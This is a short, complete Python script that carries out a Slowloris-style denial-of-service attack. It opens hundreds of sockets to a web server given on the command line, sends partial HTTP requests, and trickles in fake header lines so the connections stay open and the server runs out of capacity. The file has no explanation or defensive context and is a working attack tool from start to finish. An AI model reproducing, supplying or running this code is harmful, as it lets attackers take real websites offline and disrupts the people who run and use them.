#!/usr/bin/env python3
import socket, random, time, threading, argparse

socks = []

def init_sock(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {host}\r\n".encode())
    s.send(b"User-Agent: Mozilla/5.0\r\n")
    s.send(b"Accept-language: en-US,en\r\n")
    return s

def keep_alive(host, port):
    while True:
        for s in list(socks):
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                socks.remove(s)
                try: socks.append(init_sock(host, port))
                except Exception: pass
        time.sleep(10)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-H", "--host", required=True)
    p.add_argument("-p", "--port", type=int, default=80)
    p.add_argument("-n", "--sockets", type=int, default=500)
    a = p.parse_args()
    for _ in range(a.sockets):
        try: socks.append(init_sock(a.host, a.port))
        except Exception: pass
    threading.Thread(target=keep_alive, args=(a.host, a.port), daemon=True).start()
    while True: time.sleep(1)

if __name__ == "__main__":
    main()